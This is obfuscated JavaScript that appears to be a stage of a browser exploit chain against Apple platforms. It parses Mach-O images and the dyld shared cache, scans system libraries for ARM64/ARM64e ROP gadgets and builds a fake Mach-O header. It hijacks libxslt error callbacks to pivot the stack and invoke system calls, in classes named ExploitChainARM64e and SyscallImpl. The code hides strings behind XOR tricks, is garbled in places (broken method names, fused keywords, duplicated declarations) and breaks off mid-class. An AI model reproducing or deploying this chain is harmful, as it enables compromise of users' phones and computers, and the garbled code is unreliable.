let r = {}; /* decoded base64 payload */
let r = {};
const K = globalResolve(([8, 95, 95, 9, 8, 9, 91, 91, 10, 92, 1, 12, 14, 92, 11, 91, 9, 10, 1, 10, 95, 8, 93, 0, 88, 8, 90, 95, 0, 95, 12, 13, 92, 10, 11, 8, 95, 91, 91, 9].map(x => {
    return String.fromCharCode(x ^ 57);
  }).loadImagesin(""))),
  {
    N: x
  } = globalResolve(([84, 3, 3, 85, 84, 85, 7, 7, 86, 0, 93, 80, 82, 0, 87, 7, 85, 86, 93, 86, 3, 84, 1, 92, 4, 84, 6, 3, 92, 3, 80, 81, 0, 86, 87, 84, 3, 7, 7, 85].map(x => {
    return String.fromCharCode(x ^ 101);
  }).loadImagesin(""))),
  T = globalResolve(([99, 55, 96, 98, 54, 52, 102, 102, 97, 98, 102, 97, 96, 109, 109, 102, 109, 108, 109, 97, 101, 101, 48, 52, 97, 102, 100, 109, 52, 51, 102, 55, 108, 52, 52, 100, 49, 54, 96, 54].map(x => {
    return String.fromCharCode(x ^ 85);
  }).loadImagesin(""))),
  {
    engine: M
  } = globalResolve(([70, 18, 69, 71, 19, 17, 67, 67, 68, 71, 67, 68, 69, 72, 72, 67, 72, 73, 72, 68, 64, 64, 21, 17, 68, 67, 65, 72, 17, 22, 67, 18, 73, 17, 17, 65, 20, 19, 69, 19].map(x => {
    return String.fromCharCode(x ^ 112);
  }).loadImagesin(""))),
  Z = M.PtrClass;

function Y(t, r = false) {
  const e = T.engine.memory,
    n = e.readU32(t.H(16));
  let s = t.H(32),
    i = new K.Ptr64(0, 0),
    o = true,
    h = false,
    c = null,
    l = null,
    f = null,
    a = 0,
    u = null,
    d = null,
    w = null,
    g = null,
    m = false;
  const E = [];
  for (let f = 0; f < n; f++) {
    const n = e.readU32(s),
      f = e.readU32(s.H(4));
    switch (n) {
      case 15:
        m = true;
        break;
      case 50:
        r && 1 === e.readU32(s.H(8)) && (w = true, g = e.readU32(s.H(12)));
        break;
      case 25: {
        const n = {
          Re: e.readStr(s.H(8), 16),
          Xe: e.readPtr(s.H(24)),
          Es: e.readPtr(s.H(24)),
          Os: e.readPtr(s.H(32)),
          Ge: e.readPtr(s.H(40)),
          zs: e.readPtr(s.H(48)),
          $s: e.readU32(s.H(56)),
          qs: e.readU32(s.H(60)),
          Ms: e.readU32(s.H(64)),
          flags: e.readU32(s.H(68)),
          Ds: s.H(72),
          Ls: {},
          dump() {}
        };
        if (r)
          for (let t = 0; t < n.nSections; t += 1) {
            const r = n.sectionsRaw.H(80 * t),
              s = {
                Re: e.readStr(r.H(16), 16),
                Vs: e.readStr(r.H(0), 16),
                Xe: e.readPtr(r.H(32)),
                Os: e.readPtr(r.H(40)),
                Ge: e.readU32(r.H(48)),
                dump() {}
              };
            n.sections[s.sectName] = s
          }
        switch (E.push(n), n.segName) {
          case ([38, 38, 45, 60, 33, 45].map(x => {
            return String.fromCharCode(x ^ 121);
          }).loadImagesin("")):
            n.fileOff.Et() ? o = false : l = t.sub(n.fileOff), i = t.sub(n.vmAddr);
            break;
          case ([20, 20, 7, 2, 5, 0, 14, 15, 2, 31].map(x => {
            return String.fromCharCode(x ^ 75);
          }).loadImagesin("")):
            u = n.vmAddr.add(i).sub(n.fileOff);
            break;
          case ([44, 44, 50, 38, 39, 59, 44, 48, 60, 61, 32, 39].map(x => {
            return String.fromCharCode(x ^ 115);
          }).loadImagesin("")):
            if (r) {
              const t = n.sections.__auth_got;
              undefined !== t && (d = t.vmAddr.add(i))
            }
        }
        break
      }
      case (4294967296 + (1215443043 ^ -932040639)):
        h = true, c = e.readU32(s.H(40)), a = e.readU32(s.H(44));
        break;
      case (4294967296 + (1699491186 ^ -447992511)):
        h = true, c = e.readU32(s.H(8)), a = e.readU32(s.H(12))
    }
    s = s.H(f)
  }
  let b = i;
  if (r && !o && !m) {
    const r = e.readU32(t.H(4));
    if (w && (1400065645 ^ 1383288417) === r && g >= (1650611011 ^ 1651069763)) {
      if (null === d) throw new Error("");
      let t = e.readPtr(d).Dt();
      if (t.Et()) throw new Error("");
      for (t = t.Bt(t.it % (1395676770 ^ 1395672674));
        (4294967296 + (961497420 ^ -945638525)) !== e.readU32(t);) t = t.Bt((1181969268 ^ 1181973364));
      const r = this.Xs(t);
      l = r.parsedHeader.dyldCacheSlide, b = r.parsedHeader.dyldCacheBase
    }
  }
  for (let t = 0; t < E.length; t++) {
    const r = E[t],
      e = r.vmAddr;
    r.vmAddr = e.add(i)
  }
  return h && c && (f = u.H(c)), new tt({
    Gs: t,
    Js: n,
    Qs: i,
    Ys: u,
    Zs: l,
    Ks: b,
    so: f,
    oo: a
  }, E)
}
r.ie = function() {
  return Y(T.engine.pn, true)
}, r.Xs = Y;
class MachOBinary {
  constructor(t, r) {
    this.parsedHeader = t, this.segments = r, this.co = new Uint8Array([]), this.lo = false
  }
  ae() {
    return new rt(this)
  }
  ue() {
    return new et(this)
  }
  fo(t) {
    const r = this.ao(([108].map(x => {
      return String.fromCharCode(x ^ 51)
    }).loadImagesin("")) + (t));
    return r ? this.parsedHeader.rwPrimAseData.H(r) : new K.Ptr64(0, 0)
  }
  ao(t) {
    if (false === this.lo) {
      this.lo = true;
      const t = new Uint32Array(this.parsedHeader.symtabSize + 3 >> 2);
      for (let r = 0; r < t.length; r++) t[r] = T.engine.memory.readU32(this.parsedHeader.symtabData.H(4 * r));
      this.co = new Uint8Array(t.buffer)
    }
    const r = this.co;
    let e = "",
      n = 0,
      s = false;
    for (; !s;) {
      s = true;
      let i = 0,
        o = 0;
      do {
        i += ((845108587 ^ 845108500) & r[n]) << o, o += 7
      } while ((1467298385 ^ 1467298513) & r[n++]);
      if (e === t && 0 !== i) {
        n++;
        let t = 0;
        o = 0;
        do {
          t += ((1917539148 ^ 1917539123) & r[n]) << o, o += 7
        } while ((1833593648 ^ 1833593776) & r[n++]);
        return t
      }
      n += i;
      const h = r[n++];
      for (let i = 0; i < h; i++) {
        let i = "";
        for (; 0 !== r[n];) i += String.fromCharCode(r[n++]);
        n++;
        let h = 0;
        o = 0;
        do {
          h += ((1886025586 ^ 1886025485) & r[n]) << o, o += 7
        } while ((1917728323 ^ 1917728451) & r[n++]);
        if (i.length && e + i === t.substr(0, e.length + i.length)) {
          e += i, n = h, s = false;
          break
        }
      }
    }
    return 0
  }
}
class MachOReaderAbsolute {
  constructor(t) {
    this.uo = t, this.do = this.uo.parsedHeader.rwPrimAseData
  }
  fo(t) {
    const r = this.uo.ao(([54].map(x => {
      return String.fromCharCode(x ^ 105)
    }).loadImagesin("")) + (t));
    return r ? this.uo.parsedHeader.rwPrimAseData.H(r) : new K.Ptr64(0, 0)
  }
  wo(t) {
    const r = this.uo.ao(([30].map(x => {
      return String.fromCharCode(x ^ 65)
    }).loadImagesin("")) + (t));
    if (!r) throw new Error("");
    return r ? this.uo.parsedHeader.rwPrimAseData.H(r) : new K.Ptr64(0, 0)
  }
  mo(t) {
    return 0 !== this.uo.ao(([111].map(x => {
      return String.fromCharCode(x ^ 48)
    }).loadImagesin("")) + (t))
  }
  Eo(...t) {
    for (const r of t) try {
      return this.wo(r)
    } catch (t) {
      continue
    }
    throw new Error("")
  }
}
class MachOReaderRelative {
  constructor(t) {
    this.uo = t, this.bo = null, this._o = this.uo.parsedHeader.rwPrimAseData.yt()
  }
  fo(t) {
    const r = this.uo.ao(([22].map(x => {
      return String.fromCharCode(x ^ 73)
    }).loadImagesin("")) + (t));
    return r ? this._o + r : 0
  }
  Eo(...t) {
    for (const r of t) try {
      return this.wo(r)
    } catch (t) {
      continue
    }
    throw new Error("")
  }
  mo(t) {
    return 0 !== this.uo.ao(([57].map(x => {
      return String.fromCharCode(x ^ 102)
    }).loadImagesin("")) + (t))
  }
  wo(t) {
    const r = this.uo.ao(([7].map(x => {
      return String.fromCharCode(x ^ 88)
    }).loadImagesin("")) + (t));
    if (!r) throw new Error("");
    return this._o + r
  }
  po(t) {
    return {
      Re: t.segName,
      Xe: t.vmAddr.yt(),
      Es: t.vmAddrCopy.yt(),
      Os: t.vmSize.yt(),
      Ge: t.fileOff.yt(),
      zs: t.zs.yt(),
      $s: t.$s,
      qs: t.qs,
      Ms: t.nSections,
      flags: t.flags,
      Ds: t.sectionsRaw.yt(),
      Ls: t.sections
    }
  }
  vo(t) {
    return {
      Re: t.segName,
      Vs: t.sectName,
      Xe: t.vmAddr.yt(),
      Os: t.vmSize.yt(),
      Ge: t.fileOff.yt()
    }
  }
  So(t) {
    for (let r = 0; r < this.uo.segments.length; r++)
      if (this.uo.segments[r].segName === t) return this.po(this.uo.segments[r]);
    return null
  }
  xo(t, r) {
    const e = this.findSegment(t);
    if (null !== e) {
      if (0 !== Object.keys(e.sections).length) {
        const t = e.sections[r];
        return undefined !== t ? this.vo(t) : null
      } {
        let n = null;
        for (let s = 0; s < e.nSections; s++) {
          const i = e.sectionsRaw + 80 * s,
            o = t,
            h = T.engine.memory.readString(i, 16),
            c = {
              Re: o,
              Vs: h,
              Xe: T.engine.memory.readPair(i + 32).add(this.uo.parsedHeader.vmSlide),
              Os: T.engine.memory.readPair(i + 40),
              Ge: T.engine.memory.readPair(i + 48)
            };
          r === h && (n = c), e.sections[h] = c
        }
        return n ? this.vo(n) : null
      }
    }
    return null
  }
  Io(t, r) {
    const e = this.findSegment(t);
    if (null !== e)
      for (let n = 0; n < e.nSections; n++) {
        const s = e.sectionsRaw + 80 * n,
          i = t,
          o = T.engine.memory.readString(s, 16);
        if (r === o) {
          const t = {
            Re: i,
            Vs: o,
            Xe: T.engine.memory.readPair(s + 32).add(this.uo.parsedHeader.vmSlide),
            Os: T.engine.memory.readPair(s + 40),
            Ge: T.engine.memory.readPair(s + 48)
          };
          return this.vo(t)
        }
      }
    return null
  }
  To(t) {
    const r = this.findSegment(t);
    if (!r) throw new Error("");
    return r
  }
  yo() {
    return null === this.bo && (this.bo = new nt(this.uo.parsedHeader.dyldCacheBase.yt(), this.uo.parsedHeader.dyldCacheSlide.yt())), this.bo
  }
  ko(t) {
    const r = this.fo(t);
    return 0 !== r ? T.engine.memory.readPair(r) : new K.Ptr64(0, 0)
  }
  Oo(t) {
    const r = this.getSegmentOrThrow(([7, 7, 12, 29, 0, 12].map(x => {
      return String.fromCharCode(x ^ 88);
    }).loadImagesin("")));
    return t - r.vmAddrCopy + r.vmAddr
  }
  zo(t) {
    const r = this.fo(t);
    return 0 !== r ? T.engine.memory.readAddrVal(r) : 0
  }
  Po(t, r) {
    const e = this.fo(t);
    return 0 !== e ? T.engine.memory.readByte(e) : r
  }
  Uo(t, r) {
    const e = this.findSegment(t);
    if (null === e) throw new Error("");
    for (let t = 0; t < e.vmSize; t += 8) {
      const n = e.vmAddr + t;
      if (T.engine.memory.readU32Raw(n) === r >>> 0 && T.engine.memory.readU32Raw(n + 4) === r / 4294967296 >>> 0) return n
    }
    throw new Error("")
  }
  Ao(t, r) {
    const e = this.findSegment(t);
    if (null === e) throw new Error("");
    const n = e.vmAddr,
      s = e.vmAddr + e.vmSize;
    return r >= n && r < s
  }
  $o(t, r, e) {
    const n = this.xo(t, r);
    if (null === n) throw new Error("");
    const s = n.vmAddr,
      i = n.vmAddr + n.vmSize;
    return e >= s && e < i
  }
  qo(t) {
    for (let r = 0; r < this.uo.segments.length; r++)
      if (this.isInSegment(this.uo.segments[r].segName, t)) returntrue;
    returnfalse
  }
  Ro(t, r) {
    const e = this.findSegment(t);
    if (null === e) throw new Error("");
    for (let t = 0; t < e.vmSize; t += 8)
      if (T.engine.memory.readPtrStripped(e.vmAddr + t) === r) return e.vmAddr + t;
    throw new Error("")
  }
  Co(t, r) {
    const e = this.findSegment(t);
    if (null === e) throw new Error("");
    for (let t = 0; t < e.vmSize; t += 8)
      if (T.engine.memory.readPtrStripped(e.vmAddr + t) === r) return T.engine.memory.readPair(e.vmAddr + t);
    throw new Error("")
  }
  Mo(t, r, e) {
    const n = this.findSegment(t);
    if (null === n) throw new Error("");
    const s = this.findSegment(r);
    if (null === s) throw new Error("");
    for (let t = 0; t < s.vmSize; t += 8) {
      const r = T.engine.memory.readPtrStripped(s.vmAddr + t);
      if (r >= n.vmAddr && r < n.vmAddr + n.vmSize && true === e(r, T.engine.memory.readPair(s.vmAddr + t))) break
    }
  }
  Do(t, r) {
    const e = this.findSegment(t);
    if (null === e) throw new Error("");
    for (let t = 0; t < e.vmSize; t += 4) {
      const n = e.vmAddr + t;
      if (true === r(n, T.engine.memory.readU32Raw(n))) break
    }
  }
  Lo(t, r) {
    const e = this.findSegment(t);
    if (null === e) throw new Error("");
    for (let t = 0; t < e.vmSize; t += 8) {
      const n = e.vmAddr + t;
      if (true === r(Z.ut(n))) break
    }
  }
  Bo(t) {
    for (const r of this.uo.segments) {
      const e = Z.ut(r.vmAddr),
        n = Z.ut(r.vmAddr).H(K._(r.vmSize));
      if (t.ui(e) && t.readU32(n)) return r
    }
    return null
  }
}
class DyldSharedCache {
  constructor(t, r) {
    this.cacheSlide = t, this.cacheHeader = r, this.Xo = false, this.parsedImages = {}, this.images = this.loadImages()
  }
  Fo() {
    return T.engine.memory.readString(this.cacheHeader)
  }
  Ho() {
    return ([60, 33, 52, 60, 7, 46, 105, 120, 120, 57, 42, 53, 110, 108, 61].map(x => {
      return String.fromCharCode(x ^ 88);
    }).loadImagesin("")) === this.magic()
  }
  Ko() {
    return this.cacheSlide
  }
  jo() {
    const t = [];
    if (!this.magic().startsWith(([61, 32, 53, 61].map(x => {
        return String.fromCharCode(x ^ 89);
      }).loadImagesin("")))) throw new Error("");
    let r = T.engine.memory.readU32Raw(this.cacheHeader + 24),
      e = T.engine.memory.readU32Raw(this.cacheHeader + 28);
    if (0 === r && 0 === e && (this.Xo = true, r = T.engine.memory.readU32Raw(this.cacheHeader + (896167506 ^ 896167826)), e = T.engine.memory.readU32Raw(this.cacheHeader + (944065869 ^ 944065673)), 0 === r && 0 === e)) throw new Error("");
    for (let n = 0; n < e; n++) {
      const e = this.cacheHeader + r + 32 * n,
        s = T.engine.memory.readPtrStripped(e) + this.cacheSlide,
        i = T.engine.memory.readU32Raw(e + 24),
        o = T.engine.memory.readString(this.cacheHeader + i);
      t.push({
        address: s,
        path: o
      })
    }
    return t
  }
  Go() {
    const t = [];
    for (const r of this.images) t.push(r.path);
    return t
  }
  Jo(t, r) {
    return this.getImage(t).wo(r)
  }
  Wo(t) {
    for (const r of this.images) try {
      return this.getImage(r.path).wo(t)
    } catch (t) {
      continue
    }
    throw new Error("")
  }
  Yo(t) {
    for (let r = 0; r < this.images.length; r++)
      if (-1 !== this.images[r].path.indexOf(t)) return this.images[r].address;
    return 0
  }
  Qo(t) {
    if (undefined === this.parsedImages[t]) {
      const r = this.findImageAddr(t);
      if (0 === r) return null;
      this.parsedImages[t] = Y(K.Ptr64.ut(r)).ue()
    }
    return this.parsedImages[t]
  }
  th(t) {
    const r = this.getImage(t);
    if (null === r) throw new Error("");
    return r
  }
  rh(...t) {
    for (const r of t) try {
      return this.th(r)
    } catch (t) {}
    throw new Error("")
  }
}
return r;;
const K = globalResolve("1ff010bb3e857e2b0383f1d9a1cf9f54e321fbb0"),
  {
    N: x,
    tn: W,
    nn: F,
    Ptr64: m,
    U: j,
    An: S,
    vn: O,
    v: o,
    I: u,
    B: s
  } = globalResolve("1ff010bb3e857e2b0383f1d9a1cf9f54e321fbb0"),
  T = globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c");
class SyscallBase {
  constructor() {
    this.Ic = null, this.gc = null, this.Cc = false
  }
  sc(i, t) {
    return new K.Ptr64(0, 0)
  }
  oe(i, t) {
    return new K.Ptr64(0, 0)
  }
  cc(i, t) {
    return new K.Ptr64(0, 0)
  }
  ac(i, t) {
    return new K.Ptr64(0, 0)
  }
}
r.Kc = ii;
class GadgetFinder {
  constructor(i) {
    this.dyldCache = i
  }
  Xc(i) {
    let t = 0;
    const c = [];
    for (let l = 0; l < i.length; l++) {
      const s = i[l]; - 0x70000000 == ((0x9f000000) & s) ? (c.push(-0x60ffffe1), t++) : t && -0x6c00000 == ((0xffc00000) & s) ? c.push(-0x3ffc01) : ((0xfc000000) & s) >>> 0 == 0x14000000 ? c.push(-0x4000000) : c.push(-1)
    }
    return {
      Tc: t,
      mask: c
    }
  }
  Mc(i) {
    const t = this.dyldCache.th(i),
      c = new Set([(0xd63f081f), (0xd63f083f), (0xd63f085f), (0xd63f087f), (0xd63f089f), (0xd63f08bf), (0xd63f08df), (0xd63f08ff)]),
      l = [];
    t.scanSegment32("__TEXT", ((i, t) => {
      c.u32Views(t) && l.push([i, t])
    })), l.length
  }
  Gc(i, t, c) {
    const l = this.dyldCache.th(i),
      {
        Tc: s,
        mask: h
      } = this.buildMask(t);
    let a = null,
      d = null,
      b = null;
    if (true === c ? (l.scanSegmentPair("__TEXT", true === globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.ejFVv9 ? "__AUTH_CONST" : "__DATA_CONST", ((i, c) => {
        let l = i;
        for (let i = 0; i < t.length; i++) {
          const c = T.engine.memory.readU32Raw(l);
          if ((t[i] & h[i]) != (c & h[i])) returnfalse;
          l += ((0xfc000000) & c) >>> 0 == 0x14000000 ? c << 6 >> 4 : 4
        }
        return a = c, true
      })), a && (d = a.Dt().yt(), b = a)) : (l.scanSegment32("__TEXT", ((i, c) => {
        let l = true;
        for (let c = 0; c < t.length; c++)
          if ((t[c] & h[c]) != (T.engine.memory.readU32Raw(i + 4 * c) & h[c])) return l = false, false;
        if (l) return a = i, true
      })), d = a), null === a) throw new Error("");
    let o = [];
    s && (o = this.extractBranches(d, false, s));
    let e = 0;
    if (false === c)
      for (let i = 0; i < 0x1000; i += 4) {
        if ((0xd503237f) === T.engine.memory.readU32Raw(a - i)) {
          e = a - i;
          break
        }
      }
    return {
      zc: a,
      Dc: e,
      Zc: o,
      Sc: b
    }
  }
  Nc(i, t) {
    for (const c of i) try {
      return this.findGadget(c, t, true)
    } catch (i) {}
    throw new Error("")
  }
  Hc(i, t) {
    for (const c of i) try {
      return this.findGadget(c, t, false)
    } catch (i) {}
    throw new Error("")
  }
  Ac(i) {
    for (const t of this.dyldCache.allPaths()) try {
      return this.findGadget(t, i, false)
    } catch (i) {}
    throw new Error("")
  }
  Pc(i) {
    for (const t of this.dyldCache.allPaths()) try {
      return this.findGadget(t, i, true)
    } catch (i) {}
    throw new Error("")
  }
  kc(i, t, c = -1, l = false) {
    const s = [];
    let h = false;
    const a = [];
    for (let i = 0; i < 31; i++) a[i] = 0;
    for (let c = 0; c < globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.zAr75o; c++) {
      const d = i + 4 * c,
        b = T.engine.memory.readU32Raw(d);
      if ((0xd65f0fff) === b || (0xd65f03c0) === b) {
        h = true;
        break
      }
      if (((0xff000000) & b) >>> 0 == 0x14000000) {
        if (l) {
          h = true;
          break
        }
      } else if (((0x9f000000) & b) >>> 0 == (0x90000000)) {
        const i = (b << 8 >> 13 << 2 | b >> 29 & 3) << 12;
        a[31 & b] = d - d % 0x1000 + i
      } else if (((0xffc00000) & b) >>> 0 == (0xf9400000)) {
        const i = b >> 5 & 31,
          t = b >> 10 & 0xfff;
        a[i] && s.push(a[i] + 8 * t)
      } else if (t && ((0xff000000) & b) >>> 0 == (0x91000000)) {
        const i = b >> 5 & 31,
          t = b >> 10 & 0xfff;
        a[i] && (s.push(a[i] + t), a[i] = 0)
      }
    }
    if (!h) throw new Error("");
    if (c > -1 && s.length !== c) throw new Error("");
    return s
  }
  vc(i, t, c, l) {
    const s = this.dyldCache.th(i),
      {
        Tc: h,
        mask: a
      } = this.buildMask(t);
    let d = null,
      b = null,
      o = null;
    if (true === c ? (s.scanSegmentPair("__TEXT", l, ((i, c) => {
        let l = i;
        for (let i = 0; i < t.length; i++) {
          const c = T.engine.memory.readU32Raw(l);
          if ((t[i] & a[i]) != (c & a[i])) returnfalse;
          l += ((0xfc000000) & c) >>> 0 == 0x14000000 ? c << 6 >> 4 : 4
        }
        return d = c, true
      })), d && (b = d.Dt().yt(), o = d)) : (s.scanSegment32("__TEXT", ((i, c) => {
        let l = true;
        for (let c = 0; c < t.length; c++)
          if ((t[c] & a[c]) != (T.engine.memory.readU32Raw(i + 4 * c) & a[c])) return l = false, false;
        if (l) return d = i, true
      })), b = d), null === d) throw new Error("");
    let e = [];
    h && (e = this.extractBranches(b, false, h));
    let y = 0;
    if (false === c)
      for (let i = 0; i < 0x1000; i += 4) {
        if ((0xd503237f) === T.engine.memory.readU32Raw(d - i)) {
          y = d - i;
          break
        }
      }
    return {
      zc: d,
      Dc: y,
      Zc: e,
      Sc: o
    }
  }
  Vc(i, t, c) {
    for (const l of i) try {
      return this.vc(l, t, true, c)
    } catch (i) {}
    throw new Error("")
  }
}
globalResolve("81502427ce4522c788a753600b04c8c9e13ac82c");
class SyscallImpl extends ii {
  sc(i, t) {
    return this.chain.invokeSyscall(this.chain.syscallNums.sc, i, t)
  }
  oe(i, t) {
    return this.chain.invokeSyscall(this.chain.syscallNums.oe, i, t)
  }
  cc(i, t) {
    return this.chain.invokeSyscall(this.chain.syscallNums.cc, i, t)
  }
  ac(i, t) {
    return this.chain.invokeSyscall(this.chain.syscallNums.ac, i, t)
  }
  Jc() {
    const i = this.fakeStruct,
      t = T.engine.memory.getBackingAddr(i);
    if (t % 0x1000 != 0) throw new Error("");
    const c = K.Ptr64.ut(t).Ut();
    return i[0] = (0xfeedfacf), i[1] = 0x100000c, i[4] = 3, i[5] = 0x110, i[8] = 25, i[9] = 0x98, i[10] = 0x45545f5f, i[11] = 0x5458, this.isARM64e && (i[14] = 0, i[15] = 0, i[16] = c.it, i[17] = c.et, i[23] = 1), i[24] = 1, this.isARM64e ? (i[34] = 0, i[35] = 0, i[36] = c.it, i[37] = c.et) : (i[34] = c.it, i[35] = c.et, i[36] = (0xffff0000), i[37] = 0x7f), i[42] = (0x80000400), i[46] = 25, i[47] = 72, i[48] = 0x494c5f5f, i[49] = 0x44454b4e, i[50] = 0x5449, i[52] = 0x130, i[56] = 0x130, i[64] = (0x80000022), i[65] = 48, i[74] = 0x130, i[75] = 0x800, i[76] = 0x615f0100, i[77] = 0x30600, i
  }
  Uc(i, t) {
    const c = K.Ptr64.ut(t);
    let l = null,
      s = 0,
      h = null,
      a = new K.Ptr64(0, 0);
    const d = this.Jc(),
      b = T.engine.memory.getBackingAddr(d),
      o = K.Ptr64.ut(b);
    if (this.isARM64e) {
      const i = this.Yc(o);
      s = i + 1, h = K.Ptr64.ut(i), l = this.stackPivotAddr
    } else s = this.Fc(b), h = o, l = T.engine.memory.readAddrVal(this.stackPivotAddr + globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.Hkum2q);
    return T.engine.memory.withSwap((() => {
      const t = new Uint8Array(d.buffer),
        l = c.sub(o);
      K.Xt(t, 0x138, l);
      const h = b + 0x133;
      a = i(this.jitWriteAddr, K.Ptr64.ut(s), K.Ptr64.ut(h))
    }), {
      Sr: l + 8,
      Zt: h
    }), a
  }
  Yc(i) {
    const t = this.jc,
      c = i.H(0x100);
    return t[20] = i.it, t[21] = i.et, t[22] = i.it, t[23] = i.et, t[24] = 0, t[25] = 0, t[29] = 0x201, t[32] = c.it, t[33] = c.et, t[36] = 0, t[37] = 0, T.engine.memory.getBackingAddr(t)
  }
  Fc(i) {
    return i / 32 + 1
  }
  qc(i) {
    const t = T.engine.memory,
      c = this.Jc(),
      l = this.$c,
      s = this.ih;
    let h = new K.Ptr64(0, 0);
    const a = K.Ptr64.ut(i);
    let d = null;
    const b = T.engine.memory.getBackingAddr(c),
      o = K.Ptr64.ut(b);
    let e = null,
      y = null;
    if (this.isARM64e) {
      const i = this.Yc(o);
      e = i + 1, y = K.Ptr64.ut(i), d = this.stackPivotAddr
    } else d = t.readAddrVal(this.stackPivotAddr + globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.Hkum2q), e = this.Fc(b), y = o;
    const I = T.engine.memory.readPair(l);
    return T.engine.memory.withSwap((() => {
      const i = new Uint8Array(c.buffer),
        s = "xsltTransformError";
      let d = 0x133;
      for (let t = 0; t < s.length; t++) i[d++] = s.charCodeAt(t);
      i[d++] = 0, i[d++] = 0x7f, d = 0x1af, i[d++] = 3, i[d++] = 0;
      const b = a.sub(o);
      K.Xt(i, d, b), t.writeU32(this.lh, 0), this.controller.triggerXSL(), h = t.readPair(l)
    }), {
      Sr: d + 8,
      Zt: y
    }, {
      Sr: s,
      Zt: K.Ptr64.ut(e)
    }, {
      Sr: l,
      Zt: I
    }, {
      Sr: this.hh,
      Zt: new K.Ptr64((0xffffffff), (0xffffffff))
    }), t.writeU32(this.lh, 0), h
  }
  constructor() {
    super(), this.fakeStruct = new Uint32Array(0x10000), K.D(this.fakeStruct), this.controller = new hi, this.controller.initTrigger(), this.dyldCache = T.ce().getDyldCache(), this.rwPrimBdgetFinder = new ti(this.dyldCache), this.isARM64e = false;
    let i = null;
    const t = this.dyldCache.th("libdyld.dylib"),
      c = this.dyldCache.th("libSystem.B.dylib"),
      l = this.dyldCache.th("libxslt"),
      s = t.wo("dlsym");
    true === globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.ejFVv9 ? this.jitWriteAddr = c.readFromSegment("__AUTH_CONST", s) : this.jitWriteAddr = c.readFromSegment("__DATA_CONST", s);
    {
      i = this.dyldCache.rh("A/Frameworks/WebCore.framework/Versions/A/WebCore", "WebCore.framework/WebCore");
      const c = l._o / 32 >>> 0;
      this.ih = i.findValueInSegment(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.ejFVv9 ? "__DATA" : "__DATA_DIRTY", c);
      const s = t.wo("_dyld_initializer"),
        h = this.rwPrimBdgetFinder.extractBranches(s, true);
      this.stackPivotAddr = h[globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.Bn19Gy]
    }
    const h = l.fo("xsltFreeTransformContext");
    let a;
    try {
      a = i.findInSegment("__DATA_DIRTY", h)
    } catch (t) {
      a = i.findInSegment(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.ejFVv9 ? "__AUTH" : "__DATA", h)
    }
    const d = l.wo("xsltTransformError");
    try {
      this.$c = i.findInSegment("__DATA_DIRTY", d)
    } catch (t) {
      this.$c = i.findInSegment("__DATA", d)
    }
    if (this.bh = a, this.lh = this.$c - 24, 1 !== T.engine.memory.readU32Raw(this.lh)) throw new Error("");
    this.hh = this.ih + 8, true === globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.rlZW0r ? this.chain = new li(this) : this.chain = new si(this)
  }
}
class ExploitChainARM64e {
  constructor(i) {
    const t = T.engine.memory,
      c = i.rwPrimBdgetFinder,
      l = i.controller;
    this.oh = new ArrayBuffer(0x120), K.D(this.oh), this.eh = t.getBackingAddr(this.oh);
    const s = c.findGadgetNoPtr(["libdyld.dylib"], [(0xdac10d02), (0xaa0203e0), (0xd65f03c0), (0xdac10902), (0xaa0203e0), (0xd65f03c0), (0xdac10502), (0xaa0203e0), (0xd65f03c0), (0xdac10102), (0xaa0203e0), (0xd65f03c0)]).rwPrimBdgetAddr - 52,
      h = c.findGadgetInImages(["libReverseProxyDevice.dylib"], [(0xd503237f), (0xa9bf7bfd), (0x910003fd), (0xa9402009), (0xa9410801), (0xaa0803e0), (0xd63f093f), (0xa8c17bfd), (0xd65f0fff)]),
      a = c.findGadgetInImages(["/PrivateFrameworks/CoreUtils.framework/Versions/A/CoreUtils", "PrivateFrameworks/CoreUtils.framework/CoreUtils"], [(0xd503237f), (0xa9be4ff4), (0xa9017bfd), (0x910043fd), (0xaa0003f3), (0xf0206e88), (0xf9453508), (0xd63f091f), (0xf9000260), (0xa9417bfd), (0xa8c24ff4), (0xd65f0fff)]),
      d = c.findGadgetAllImages([(0xd009cbc8), (0xf945a108), (0xb4000128), (0xd503237f), (0xa9bf7bfd), (0x910003fd), (0xd009cbc9), (0xf945a520), (0xd63f091f), (0xa8c17bfd), (0xd50323ff), (0xd65f03c0)]),
      b = d.branchTargets[1],
      o = d.branchTargets[0],
      e = a.branchTargets[0];
    this.yh = (c, s, y, I) => (t.writePtr(this.eh + 0, c), t.writePtr(this.eh + 8, s), t.writePtr(this.eh + 16, y), t.writePtr(this.eh + 24, I), t.withSwap((() => {
      l.triggerXSL()
    }), {
      Sr: i.bh,
      Zt: d.ptrValue
    }, {
      Sr: b,
      Zt: K.Ptr64.ut(this.eh)
    }, {
      Sr: o,
      Zt: a.ptrValue
    }, {
      Sr: e,
      Zt: h.ptrValue
    }), t.readPair(this.eh));
    this.Ih = i.Uc(((c, s, y) => (t.writePtr(this.eh + 0, c), t.writePtr(this.eh + 8, s), t.writePtr(this.eh + 16, y), t.withSwap((() => {
      l.triggerXSL()
    }), {
      Sr: i.bh,
      Zt: d.ptrValue
    }, {
      Sr: b,
      Zt: K.Ptr64.ut(this.eh)
    }, {
      Sr: o,
      Zt: a.ptrValue
    }, {
      Sr: e,
      Zt: h.ptrValue
    }), t.readPair(this.eh))), s), this.uh = new ArrayBuffer(64), this.gh = t.getBackingAddr(this.uh), this.nh = K.Ptr64.ut(this.gh), K.D(this.uh), this.syscallNums = {
      sc: (0xff010000),
      oe: (0xff030000),
      ac: (0xff050000),
      cc: (0xff070000)
    };
    this.invokeSyscall = (i, c, l) => {
      const s = Math.abs(l.et >>> 16);
      return t.jr(this.gh, 0, i | s), this.yh(this.Ih, this.nh, l, c)
    }
  }
}
class ExploitChainARM64 {
  constructor(i) {
    const t = T.engine.memory,
      c = i.rwPrimBdgetFinder,
      l = i.controller;
    let s, h;
